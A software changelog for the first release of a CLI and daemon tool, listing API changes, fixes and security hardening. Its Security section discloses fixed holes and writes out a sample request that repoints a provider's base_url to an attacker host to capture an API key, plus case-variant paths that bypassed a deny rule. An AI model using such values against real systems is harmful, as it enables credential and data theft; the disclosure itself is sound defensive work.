# Changelog

All notable changes to idea-harness are recorded here, following
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

Versioning is pre-1.0: the CLI surface, the HTTP API, and the on-disk config schema may change in
any release. Breaking changes are listed under **Changed** or **Removed** with the migration in the
entry itself. Once 1.0 ships, this project follows semantic versioning.

## [0.1.0] - 2026-09-03

First release. Everything below shipped in it: the tag was cut, held as an
unpublished draft while the API was unified, and re-cut so the first version
anyone can install is the one with a single addressing convention rather than
the two it started with.

### Changed — BREAKING (HTTP API)

Breaking relative to pre-release builds of `main`, not to any published version: this is the first
release, and the shape below is the one it ships with. That is why the tag was re-cut rather than
published as first drafted — publishing the old shape would have made this a migration users owed
instead of a change that cost nothing.

- Ten initiative-scoped reads moved from the flat `?initiative_id=` form to the nested path, so the
  API now has one addressing convention instead of two:

  ```text
  GET /projects/{projectId}/requirements?initiative_id=X   →  removed (404)
  GET /projects/{projectId}/initiatives/X/requirements     →  use this
  ```

  Affected: `requirements`, `assertions`, `artifacts`, `decisions`, `questions`, `findings`,
  `change-sets`, `suggested-answers`, `risk`, `doctor`. Resources addressed by their own id
  (`change-sets/{id}/apply`, `artifacts/{id}/raw`, …) and genuinely project-scoped routes
  (`providers`, `models`, `executors`) are unchanged.

  The initiative is now a required path segment. Omitting it used to be legal and made the daemon
  pick one for you — invisible in a single-initiative project, a silent wrong answer in any other.
  A stale `?initiative_id=` on a nested URL is ignored.

- `GET /initiatives/{id}/next-move` is now `GET /initiatives/{id}/guidance`. The response is
  unchanged. `/next` and `/next-move` read as variants of one endpoint and are not: `/next` returns
  a machine-executable command token and is change-set aware, while this one returns display copy
  and is change-set blind, so the two can legitimately disagree.

- `idea decisions` and `idea reviews` take an optional initiative argument, like `idea tasks`. In a
  project with no initiative they now say `no initiatives yet; run \`idea new\` first` instead of the
  daemon's `no initiatives in project`.

### Added

- The API reference can be hosted away from the binary. `APIDOCS=0 make build` drops it and 3.69 MiB
  (33.99 MiB → 30.30 MiB); the spec stays embedded either way, so a stripped binary still describes
  itself at `/openapi.yaml`. `make api-docs-dist` produces a static bundle, and
  `scripts/publish-api-docs.sh <cloudflare|aws|fastly> [--dry-run]` publishes it. See
  `docs/api-reference-hosting.md`.
- `make api-check` now runs in CI. It has caught three endpoints added by other work in progress and
  previously only ran when someone remembered to type it.

- `docs/openapi.yaml` — an OpenAPI 3.1 description of all 70 operations, and `make api-check`, which
  fails when a route exists that the spec does not document or the reverse.
- A running daemon serves the spec and a rendered API reference without a token, outside `/api/`:
  `http://127.0.0.1:8787/openapi.yaml` and `/api-reference`.


- CI builds, vets, tests and smoke-tests on macOS as well as Linux. Nothing in the codebase branches
  on the operating system, so the differences that matter are filesystem semantics — case
  sensitivity, symlink resolution — which is exactly where the path guard and the change-set deny
  live. A case-sensitivity bypass in that deny reached a release before this job existed.
- `README.md` states the supported platforms: macOS and Linux are tested in CI; Windows is not
  supported, because the CLI starts its daemon in a new session and there is no Windows equivalent
  in the tree yet.

- `idea version` (and `--version`) prints the version, commit and whether the build came from a dirty
  tree; `idea doctor` prints the same stamp. The daemon's `/api/v1/version` reports it too, replacing
  a hardcoded `0.1.0` that every install returned regardless of what it was built from.
- Tagged releases build prebuilt macOS and Linux binaries in CI (goreleaser), with the web UI
  embedded and `-trimpath` so no maintainer's local paths ship inside them.

- `idea next --until-human` runs the automatable steps (`advance` → `execute` → `verify`) back to
  back, waiting for each to finish, and stops at the first human judgment point. The documented
  quick start drops from 13 commands to 8. A failed step stops the loop rather than continuing.
- `idea help --format=md` writes the command table as markdown to stdout (the human `idea help`
  still goes to stderr, unchanged). `docs/cli.md` embeds that table between generated-block markers,
  and `make docs` regenerates it. `docs/cli.md` documented 16 of the 36 commands the CLI dispatches;
  `risk`, `diff`, `cancel` and `change <id>` appeared in no document at all. `make docs-check` fails
  on drift and runs in CI, so a new command can no longer ship undocumented.

### Changed

- `idea apply` on a change set that cannot be applied now fails with what to do instead — already
  applied (`idea revert`), not yet approved (`idea review … approve`), rejected (`idea reviews`).
  Apply is asynchronous, so it previously answered `✓ apply started` and failed out of sight.

- The Go module path is now `github.com/devarispbrown/idea-harness`, matching the repository. It
  declared `github.com/idea-harness/idea-harness`, which resolves nowhere, so no tag could ever have
  made `go install <module>@<version>` work. Free to change now (no tags, no consumers); a breaking
  change the moment either exists, which is why it lands before the first tag.

- `idea model set` refuses a provider that does not exist, naming the ones that do. It previously
  answered `✓ default model set to bogus/model` and failed at the first run.
- `idea doctor` exits non-zero when a check fails. It printed the failure and exited 0, so a script
  that ran it as the post-install check could not tell.
- `idea help` now lists `verify`, `next` and `help` itself, which were dispatched but never shown.

- Unknown flags are now an error naming the command's accepted flags, instead of being silently
  treated as a positional argument (or, for `idea next`, discarded).
- `idea plan --json` now fails with a message pointing at `idea tasks --json`. It previously accepted
  the flag and printed markdown. The execution plan is a markdown artifact and has no JSON form.
- `idea prd` and `idea export` render daemon errors in the same shape as every other command; they
  previously printed the raw response body behind a `daemon: ` prefix.
- `idea verify --json` now emits the verification status and coverage as JSON. It previously accepted
  the flag and printed human-formatted output.
- `docs/configuration.md` documents the top-level `harness.yaml` fields, including `git_commit`,
  which README, the quick start and `docs/ui.md` all referenced while the configuration reference
  did not mention it at all.

- `README.md` no longer describes Node and pnpm as optional for installing. They are needed only to
  change the web UI.

### Fixed

- `idea prd`, `idea export` and `idea plan` render the artifact belonging to the initiative you are
  working on. They selected the last artifact of a matching kind from whatever initiative the daemon
  defaulted to, so in a project with more than one initiative they could silently render another
  initiative's PRD or plan. `idea export --json` also treated the flag as an artifact kind.
- Endpoints that resolve an initiative from `?initiative_id=` fall back to the most recent
  initiative when it is omitted, matching what the CLI means by "the initiative you are working on".
  They fell back to the oldest, so the daemon could answer about a different initiative than the CLI
  was asking about.
- A completed initiative no longer suggests more work: `idea status` said `● complete` and then
  `→ Resolve open questions`. Anything still open on a complete initiative is reported as being on
  the record, not as a next step.
- A pre-existing config problem no longer blocks unrelated provider writes. Any error anywhere in
  `harness.yaml` rejected every `idea model set` and UI Settings save — including the one that would
  have fixed it. Only problems attributable to what the request writes block it now.

- `idea next --until-human` stops when a step changes nothing instead of retrying it. After `apply`,
  the verification gate runs clean while the initiative waits on human evidence, so the loop ran the
  gate 50 times and then exited non-zero blaming the initiative — on the quick start's own path. It
  now names the requirements still missing evidence and the command that records it.

- Unknown ids get an error that names them. `idea apply CHG-99` answered `sql: no rows in result
  set` — the database driver's own string, with no indication of what was wrong or how to fix it.
  It now answers `no change set matching "CHG-99"`. The mapping lives at the store boundary, so
  every command and endpoint that looks something up inherits it.
- Server-side failures no longer expose internal detail. A 5xx now carries a generic message and a
  correlation id, with the full error logged under that id.

- `idea config validate` reports a configuration that cannot work. A model spec naming a provider
  that resolves to nothing — `idea model set bogus/model`, or a hand-edited `default_model`,
  `executor.model` or `models.<role>` — used to answer `config: valid`. It is now an error naming
  the field and listing the providers that are configured. A known provider whose `api_key_env` is
  unset is a warning, not an error: running without a key is demo mode. Custom OpenAI-compatible
  providers (Groq, Together, LM Studio) stay valid — any name under `harness.providers` counts as
  configured. A config with problems still loads, so upgrading never makes an existing project
  unopenable.

- `--json` works on the state-returning commands: `tasks`, `changes`, `risk`, `explain`, `why`,
  `impact`, `trace`, `diff` and `verify`. Each of them treated the flag itself as a positional
  initiative reference, so the daemon looked up an initiative named `--json`, missed, and the CLI
  printed `sql: no rows in result set` and exited 1. `idea trace --json` returns one
  `{"why": …, "impact": …}` document rather than two concatenated arrays.
- `advance`, `execute`, `watch` and `next` had the same mis-parse and now reject unknown flags
  outright; they take no flags and produce no JSON.

- A clean checkout now compiles with no Node toolchain. `internal/web/dist/` was ignored by git while
  `internal/web/web.go` embeds it, so `go install ./cmd/idea`, `make test`, and `make vet` all failed
  in a fresh clone with `pattern dist: no matching files found`. A placeholder `dist/index.html` is
  committed; `make build` overwrites it with the real UI.

### Security

- The control-plane deny is case-insensitive. `.idea-harness/**` and `.git/**` were matched exactly,
  so on a case-insensitive filesystem (macOS and Windows by default) a change set naming
  `.IDEA-HARNESS/harness.yaml` or `.Git/hooks/pre-commit` was accepted and written — into the very
  directories the deny exists to protect.

- A provider's `base_url` is validated when the provider registry is built, not only on the write
  path, so a `harness.yaml` that arrives another way — a cloned repo, a hand edit, a restored backup
  — cannot repoint a preset provider at another host and inherit its API key. A refused entry is not
  registered: a preset falls back to its built-in endpoint, a custom name becomes unresolvable, the
  project still opens, and the reason is logged and reported. The providers view now shows the
  endpoint requests actually reach rather than the refused one.

- The web UI response carries a Content-Security-Policy and `Cache-Control: no-store`. The page
  embeds the per-install API token in a meta tag and the daemon binds a fixed loopback port that
  other local dev servers also use — an origin, and a browser cache, idea-harness does not own.
  Hashed assets keep a long TTL; their URL changes when their bytes do.
- `make embed-web` installs with `--frozen-lockfile`, `web/package.json` pins the package manager,
  and pnpm's install-script allowlist is declared empty, so re-enabling install-time code execution
  is a reviewable diff rather than a local `pnpm approve-builds`.

- A change set can no longer modify the harness control plane. `.idea-harness/**` (providers and
  their `base_url`, network policy, executor kind, `build_cmd`/`test_cmd`, `git_commit`) and
  `.git/**` (hooks, which run on your next manual commit) are excluded from the snapshot that
  becomes a change set, and a patch naming one is rejected before anything is written. Containment
  allowed both, and neither tripped the secret sweep or the path guard. `.gitignore` is unaffected.
- A coding agent is no longer launched with a provider key nobody chose. An unknown provider in
  `harness.executor.model` used to fall back to the first preset API key present in the environment,
  and the agent runs in a container with network egress. An unresolvable provider now fails the run
  with a message naming the model.
- A provider `base_url` is validated before it is stored. `PUT /providers` accepted any string and
  the registry registered it over the preset default, so `{"providers":{"openai":{"base_url":
  "https://attacker.tld/v1"}}}` sent `OPENAI_API_KEY` and the full prompt context to that host — no
  inline secret, so the existing secret check saw nothing wrong. A `base_url` must now be `https`,
  or `http` on loopback (ollama and LM Studio run locally), and overriding a built-in preset's
  endpoint is rejected outright; configure a differently-named provider instead. Keyless local
  presets may still move between loopback ports. `idea config validate` applies the same checks to a
  hand-edited `harness.yaml`.
